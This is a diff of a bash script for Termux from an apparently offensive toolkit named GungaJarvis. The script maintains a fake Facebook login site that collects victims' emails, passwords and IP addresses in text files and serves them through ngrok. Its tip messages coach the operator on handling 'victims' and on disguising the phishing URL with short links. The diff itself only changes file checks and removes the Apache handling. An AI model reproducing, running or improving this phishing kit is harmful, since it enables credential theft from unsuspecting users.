@@ -1,6 +1,4 @@
 #! /data/data/com.termux/files/usr/bin/bash
-apache_dir='/data/data/com.termux/files/usr/share/apache2/default-site/htdocs'
-
 arr[0]='\nCaution: More than 50 gmails and 50 passwords are not stored, for storage purposes.\n\n'
 arr[1]='\nCaution: You cannot use a single server for many victims.\n\n'
 arr[2]='\nTip: You can use "short urls" to change your ngrok url.\n\n'
@@ -16,13 +14,8 @@ cd $HOME/GungaJarvis/utils/phishing/websites/facebook/
 if [[ -e gmail.txt && -e pass.txt && -e process.php && -e style.css && -e index.html && -e facebook.sh && ip.php && ip.txt ]]; then
 echo '' >/dev/null 2>&1
 else
-cd $apache_dir
-fi
-if [[ -e gmail.txt && -e pass.txt && -e process.php && -e style.css && -e index.html && ip.php && ip.txt ]]; then
-mv $apache_dir/* $HOME/GungaJarvis/utils/phishing/websites/facebook/
-else
-echo 'Sorry to say: Some files are deleted. Please reinstall GungaJarvis'
-exit 1
+bash $HOME/GungaJarvis/update
+echo 'Please Restart GungaJarvis'
 fi
 }
 check_files
@@ -34,8 +27,6 @@ echo ''
 echo -e 'Ngrok stopped...'
 killall php
 echo -e 'Php stopped...'
-apachectl stop > /dev/null 2>&1
-echo -e 'Apache2 stopped...'
 }
 
 requirements() {
